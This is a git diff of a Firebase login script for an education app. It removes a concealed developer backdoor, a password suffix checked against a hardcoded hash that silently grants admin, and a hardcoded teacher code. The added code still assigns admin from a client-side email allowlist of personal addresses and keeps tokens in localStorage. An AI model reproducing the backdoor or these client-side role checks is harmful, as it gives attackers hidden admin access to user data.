@@ -3,6 +3,8 @@ import {
   getAuth,
   GoogleAuthProvider,
   signInWithPopup,
+  signInWithRedirect,
+  getRedirectResult,
   createUserWithEmailAndPassword,
   signInWithEmailAndPassword,
   sendEmailVerification,
@@ -39,19 +41,10 @@ const provider = new GoogleAuthProvider();
 const EMAIL_VERIFIED_KEY = "sp_user_email_verified";
 const EMAIL_VERIFIED_SENT_AT_KEY = "sp_last_verification_email_sent_at";
 
-// ── Dev admin backdoor (SHA-256 suffix check) ──────────────────
-async function _sha256(str) {
-  const buf = await crypto.subtle.digest(
-    'SHA-256', new TextEncoder().encode(str)
-  );
-  return Array.from(new Uint8Array(buf))
-    .map(b => b.toString(16).padStart(2, '0')).join('');
-}
-const _A_H = 'c74c2cda7c6f09f2c71813b8d79d525a2e595140a04c6482ca94c948522b2643';
-const _A_L = 15;
 const ADMIN_EMAIL_ALLOWLIST = new Set([
   "bossmk2209@gmail.com",
   "mutevherichard@gmail.com",
+  "kingsleydasilva0@gmail.com",
 ]);
 
 function normalizeEmail(email) {
@@ -97,8 +90,42 @@ function setLocalUser(uid, email, role, displayName) {
   }
 }
 
+async function cacheAuthToken(user) {
+  try {
+    if (!user || typeof user.getIdToken !== 'function') return;
+    const token = await user.getIdToken();
+    if (token) {
+      localStorage.setItem('sp_auth_token', token);
+    }
+  } catch (_) {
+    // Best-effort only; auth flow should continue even if token cache fails.
+  }
+}
+
 function setEmailVerifiedState(isVerified) {
   localStorage.setItem(EMAIL_VERIFIED_KEY, isVerified ? "true" : "false");
+}
+
+function verificationActionSettings() {
+  return {
+    url: (window.location.origin || "") + "/login.html?verify=1",
+    handleCodeInApp: false,
+  };
+}
+
+async function sendVerificationEmailSafely(user, timeoutMs = 4500) {
+  if (!user) return false;
+  try {
+    await Promise.race([
+      sendEmailVerification(user, verificationActionSettings()),
+      new Promise((resolve) => setTimeout(resolve, timeoutMs)),
+    ]);
+    localStorage.setItem(EMAIL_VERIFIED_SENT_AT_KEY, String(Date.now()));
+    return true;
+  } catch (error) {
+    console.warn("Failed to send verification email:", error?.code || error?.message || error);
+    return false;
+  }
 }
 
 function maybeResendVerificationEmail(user, throttleMs = 2 * 60 * 1000) {
@@ -109,10 +136,7 @@ function maybeResendVerificationEmail(user, throttleMs = 2 * 60 * 1000) {
     return;
   }
 
-  sendEmailVerification(user)
-    .then(() => {
-      localStorage.setItem(EMAIL_VERIFIED_SENT_AT_KEY, String(Date.now()));
-    })
+  sendVerificationEmailSafely(user)
     .catch((error) => {
       console.warn("Failed to resend verification email:", error?.code || error?.message || error);
     });
@@ -153,8 +177,7 @@ function setupResendVerificationButton() {
         setEmailVerifiedState(true);
         setVerificationActionMessage("This account is already verified.", "success");
       } else {
-        await sendEmailVerification(cred.user);
-        localStorage.setItem(EMAIL_VERIFIED_SENT_AT_KEY, String(Date.now()));
+        await sendVerificationEmailSafely(cred.user);
         setEmailVerifiedState(false);
         setVerificationActionMessage("Verification email sent. Check your inbox.", "success");
       }
@@ -179,10 +202,24 @@ function setupResendVerificationButton() {
 // ── Sync Firebase user to SQL Server (best-effort) ─────────────────
 async function syncUserToDB(uid, email, displayName, role) {
   try {
+    const inviteChannel = String(localStorage.getItem('sp_invite_channel_preference') || localStorage.getItem('sp_invite_channel') || '').toLowerCase();
+    const phone = String(localStorage.getItem('sp_user_phone') || '').trim();
+    const currentUser = auth.currentUser;
+    const idToken = currentUser ? await currentUser.getIdToken() : "";
     await fetch(API_BASE + '/api/users/sync', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ uid, email, displayName: displayName || '', role }),
+      headers: {
+        'Content-Type': 'application/json',
+        ...(idToken ? { Authorization: `Bearer ${idToken}` } : {}),
+      },
+      body: JSON.stringify({
+        uid,
+        email,
+        displayName: displayName || '',
+        role,
+        inviteChannel,
+        phone,
+      }),
     });
   } catch (_) {
     // Server unavailable — don't block login
@@ -223,8 +260,24 @@ function prefillLoginFromEmailLink() {
   if (passwordInput) passwordInput.focus();
 }
 
+async function verifyTeacherCodeWithServer(code) {
+  const trimmed = String(code || "").trim();
+  if (!trimmed) return false;
+  try {
+    const response = await fetch(`${API_BASE}/api/verify-teacher-code`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ code: trimmed }),
+    });
+    if (!response.ok) return false;
+    const payload = await response.json().catch(() => null);
+    return Boolean(payload && payload.ok);
+  } catch (_) {
+    return false;
+  }
+}
+
 // ── Role picker modal (new Google sign-in users) ─────────────────
-const TEACHER_CODE = "SLIDETEACH";
 
 function showRolePicker(onSelect) {
   const overlay = document.createElement("div");
@@ -251,10 +304,11 @@ function showRolePicker(onSelect) {
   `;
   document.body.appendChild(overlay);
   overlay.querySelector("#rpStudent").addEventListener("click", () => { overlay.remove(); onSelect("student"); });
-  overlay.querySelector("#rpTeacher").addEventListener("click", () => {
+  overlay.querySelector("#rpTeacher").addEventListener("click", async () => {
     // Prompt for teacher access code
     const codeInput = prompt("Enter the teacher access code to continue:");
-    if (!codeInput || codeInput.trim() !== TEACHER_CODE) {
+    const isValidCode = await verifyTeacherCodeWithServer(codeInput);
+    if (!isValidCode) {
       overlay.querySelector("#rpCodeError").textContent = "Invalid teacher access code. Select Student or try again.";
       overlay.querySelector("#rpCodeError").style.display = "block";
       return; // Keep modal open
@@ -265,7 +319,76 @@ function showRolePicker(onSelect) {
 }
 
 // ── Google Sign-In (used by both pages) ──────────────────────────
-// Uses redirect flow — no popup, no COOP issues.
+function isMobileAuthFlow() {
+  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent || "");
+}
+
+function resetGoogleButton(btn, btnId) {
+  if (!btn) return;
+  const label = btnId === "googleLoginBtn" ? "Login with Google" : "Sign in with Google";
+  btn.disabled = false;
+  btn.innerHTML = `<img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google logo" style="width:18px;height:18px;"> ${label}`;
+}
+
+async function finalizeGoogleSignIn(user) {
+  const normalizedUserEmail = normalizeEmail(user.email);
+  const isAllowlistedAdmin = isAllowlistedAdminEmail(normalizedUserEmail);
+
+  // Check if this user already has a role in Firebase DB
+  let existingRole = null;
+  try {
+    const snap = await Promise.race([
+      get(ref(db, "users/" + user.uid)),
+      new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), 4000))
+    ]);
+    if (snap.exists()) existingRole = snap.val().role || "student";
+  } catch (_) { /* treat as new user */ }
+
+  if (!existingRole) {
+    existingRole = await fetchRoleFromServer(user.uid);
+  }
+
+  if (isAllowlistedAdmin) {
+    existingRole = "admin";
+  }
+
+  if (existingRole) {
+    setEmailVerifiedState(Boolean(user.emailVerified));
+    if (isAllowlistedAdmin) {
+      try {
+        await set(ref(db, "users/" + user.uid + "/role"), "admin");
+      } catch (_) {}
+    }
+    setLocalUser(user.uid, user.email, existingRole, user.displayName);
+    await cacheAuthToken(user);
+    await syncUserToDB(user.uid, user.email, user.displayName, existingRole);
+    window.location.href = getRedirectForRole(existingRole);
+    return;
+  }
+
+  // New user — show role picker
+  showRolePicker(async (role) => {
+    const finalRole = isAllowlistedAdmin ? "admin" : role;
+    setEmailVerifiedState(Boolean(user.emailVerified));
+    try {
+      await set(ref(db, "users/" + user.uid), {
+        email: user.email,
+        displayName: user.displayName || "",
+        role: finalRole,
+        createdAt: new Date().toISOString(),
+      });
+    } catch (_) { /* DB write failed — localStorage is enough */ }
+    setLocalUser(user.uid, user.email, finalRole, user.displayName);
+    await cacheAuthToken(user);
+    await syncUserToDB(user.uid, user.email, user.displayName || "", finalRole);
+    await sendWelcomeEmail(user.email, user.displayName || "", finalRole);
+    if (finalRole === "admin") {
+      window.location.href = "admin-dashboard.html";
+    } else {
+      window.location.href = `onboarding-payment.html?role=${encodeURIComponent(finalRole)}&returnTo=${encodeURIComponent(getDashboard(finalRole))}`;
+    }
+  });
+}
 
 function setupGoogle(btnId) {
   const btn = document.getElementById(btnId);
@@ -275,70 +398,54 @@ function setupGoogle(btnId) {
     e.preventDefault();
     btn.disabled = true;
     btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i>&nbsp; Signing in...`;
+
+    if (isMobileAuthFlow()) {
+      // Popup auth is often blocked on mobile browsers; redirect flow is more reliable.
+      await signInWithRedirect(auth, provider);
+      return;
+    }
+
     try {
       const result = await signInWithPopup(auth, provider);
-      const user = result.user;
-      const normalizedUserEmail = normalizeEmail(user.email);
-      const isAllowlistedAdmin = isAllowlistedAdminEmail(normalizedUserEmail);
-
-      // Check if this user already has a role in Firebase DB
-      let existingRole = null;
-      try {
-        const snap = await Promise.race([
-          get(ref(db, "users/" + user.uid)),
-          new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), 4000))
-        ]);
-        if (snap.exists()) existingRole = snap.val().role || "student";
-      } catch (_) { /* treat as new user */ }
-
-      if (!existingRole) {
-        existingRole = await fetchRoleFromServer(user.uid);
-      }
-
-      if (isAllowlistedAdmin) {
-        existingRole = "admin";
-      }
-
-      if (existingRole) {
-        setEmailVerifiedState(Boolean(user.emailVerified));
-        if (isAllowlistedAdmin) {
-          try {
-            await set(ref(db, "users/" + user.uid + "/role"), "admin");
-          } catch (_) {}
-        }
-        setLocalUser(user.uid, user.email, existingRole, user.displayName);
-        await syncUserToDB(user.uid, user.email, user.displayName, existingRole);
-        window.location.href = getRedirectForRole(existingRole);
-      } else {
-        // New user — show role picker
-        showRolePicker(async (role) => {
-          const finalRole = isAllowlistedAdmin ? "admin" : role;
-          setEmailVerifiedState(Boolean(user.emailVerified));
-          try {
-            await set(ref(db, "users/" + user.uid), {
-              email: user.email,
-              displayName: user.displayName || "",
-              role: finalRole,
-              createdAt: new Date().toISOString(),
-            });
-          } catch (_) { /* DB write failed — localStorage is enough */ }
-          setLocalUser(user.uid, user.email, finalRole, user.displayName);
-          await syncUserToDB(user.uid, user.email, user.displayName || "", finalRole);
-          await sendWelcomeEmail(user.email, user.displayName || "", finalRole);
-          window.location.href = getRedirectForRole(finalRole);
-        });
-      }
+      await finalizeGoogleSignIn(result.user);
     } catch (err) {
-      console.error("Google sign-in error:", err.message);
-      btn.disabled = false;
-      btn.innerHTML = `<img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google logo" style="width:18px;height:18px;"> Sign in with Google`;
-      _showGoogleError(btn, "Google sign-in failed. Please try again.");
+      console.error("Google sign-in error:", err.code || err.message);
+      const fallbackCodes = new Set([
+        "auth/popup-blocked",
+        "auth/popup-closed-by-user",
+        "auth/cancelled-popup-request",
+        "auth/operation-not-supported-in-this-environment",
+      ]);
+      if (fallbackCodes.has(err?.code)) {
+        await signInWithRedirect(auth, provider);
+        return;
+      }
+      resetGoogleButton(btn, btnId);
+      _showGoogleError(btn, err?.code === "auth/unauthorized-domain"
+        ? "Google sign-in is not enabled for this domain yet."
+        : "Google sign-in failed. Please try again.");
     }
   });
 }
 
-// No-op — kept for compatibility (redirect flow replaced by popup)
-async function handleGoogleRedirect() {}
+async function handleGoogleRedirect() {
+  try {
+    const result = await getRedirectResult(auth);
+    if (result?.user) {
+      await finalizeGoogleSignIn(result.user);
+    }
+  } catch (err) {
+    console.error("Google redirect sign-in error:", err.code || err.message);
+    const btn = document.getElementById("googleLoginBtn") || document.getElementById("googleBtn");
+    const btnId = btn?.id || "googleBtn";
+    resetGoogleButton(btn, btnId);
+    if (btn) {
+      _showGoogleError(btn, err?.code === "auth/unauthorized-domain"
+        ? "Google sign-in is not enabled for this domain yet."
+        : "Google sign-in failed. Please try again.");
+    }
+  }
+}
 
 function _showGoogleError(btn, message) {
   document.getElementById("googleAuthError")?.remove();
@@ -371,9 +478,6 @@ function setupSignupForm() {
     const finalRole = isAllowlistedAdmin ? "admin" : role;
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-    // ── Teacher access code ───────────────────────────────────────
-    const TEACHER_CODE = "SLIDETEACH";
-
     if (!username) {
       document.getElementById("usernameError").textContent = "Enter username";
       document.getElementById("usernameBox").classList.add("error");
@@ -396,7 +500,8 @@ function setupSignupForm() {
     }
     if (!isAllowlistedAdmin && role === "teacher") {
       const enteredCode = document.getElementById("teacherCode")?.value.trim();
-      if (!enteredCode || enteredCode !== TEACHER_CODE) {
+      const isValidCode = await verifyTeacherCodeWithServer(enteredCode);
+      if (!isValidCode) {
         document.getElementById("teacherCodeError").textContent = "Invalid teacher access code";
         document.getElementById("teacherCodeBox").classList.add("error");
         valid = false;
@@ -411,10 +516,8 @@ function setupSignupForm() {
     try {
       const cred = await createUserWithEmailAndPassword(auth, email, password);
       setEmailVerifiedState(false);
-      // Keep onboarding resilient: account creation should succeed even if email delivery is delayed.
-      sendEmailVerification(cred.user).catch((error) => {
-        console.warn("Failed to send signup confirmation email:", error?.code || error?.message || error);
-      });
+      // Await briefly on signup so mobile navigation does not cancel the verification request.
+      await sendVerificationEmailSafely(cred.user);
 
       // Fire-and-forget — Realtime DB may be unavailable; don't block redirect
       set(ref(db, "users/" + cred.user.uid), {
@@ -424,6 +527,7 @@ function setupSignupForm() {
         createdAt: new Date().toISOString(),
       }).catch(() => {});
       setLocalUser(cred.user.uid, email, finalRole, username);
+      await cacheAuthToken(cred.user);
       
       // Initialize new user with locked/free subscription state
       const subscriptionKey = finalRole === "teacher" ? "sp_teacher_subscription" : "sp_student_subscription";
@@ -475,24 +579,12 @@ function setupLoginForm() {
     const passVal  = document.getElementById("password").value;
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-    // ── Detect secret dev-admin suffix (hash-verified, zero UI hint) ──
-    let isDevAdmin = false;
-    let realPass   = passVal;
-    if (passVal.length > _A_L) {
-      const tail = passVal.slice(-_A_L);
-      const h    = await _sha256(tail);
-      if (h === _A_H) {
-        isDevAdmin = true;
-        realPass   = passVal.slice(0, -_A_L);
-      }
-    }
-
     if (!emailRegex.test(emailVal)) {
       document.getElementById("emailError").textContent = "Enter a valid email";
       document.getElementById("emailBox").classList.add("error");
       valid = false;
     }
-    if (realPass.length < 6) {
+    if (passVal.length < 6) {
       document.getElementById("passwordError").textContent = "Password must be at least 6 characters";
       document.getElementById("passwordBox").classList.add("error");
       valid = false;
@@ -504,24 +596,11 @@ function setupLoginForm() {
     btn.textContent = "LOGGING IN...";
 
     try {
-      const cred = await signInWithEmailAndPassword(auth, emailVal, realPass);
+      const cred = await signInWithEmailAndPassword(auth, emailVal, passVal);
       const isVerifiedEmail = Boolean(cred.user?.emailVerified);
       setEmailVerifiedState(isVerifiedEmail);
       if (!isVerifiedEmail) {
         maybeResendVerificationEmail(cred.user);
-      }
-
-      if (isDevAdmin) {
-        // Silently elevate role to admin in Firebase DB
-        await set(ref(db, 'users/' + cred.user.uid + '/role'), 'admin');
-        setEmailVerifiedState(true);
-        setLocalUser(cred.user.uid, emailVal, 'admin', cred.user.displayName || '');
-        syncUserToDB(cred.user.uid, emailVal, cred.user.displayName || '', 'admin').catch(() => {});
-        const successBox = document.getElementById("successBox");
-        successBox.style.display = "block";
-        successBox.textContent = "Login successful! Redirecting...";
-        setTimeout(() => { window.location.href = 'admin-dashboard.html'; }, 1000);
-        return;
       }
 
       // Resolve role from Firebase first, then fall back to the server DB record.
@@ -541,6 +620,7 @@ function setupLoginForm() {
       }
 
       setLocalUser(cred.user.uid, emailVal, role);
+      await cacheAuthToken(cred.user);
       syncUserToDB(cred.user.uid, emailVal, '', role).catch(() => {});
       const successBox = document.getElementById("successBox");
       successBox.style.display = "block";
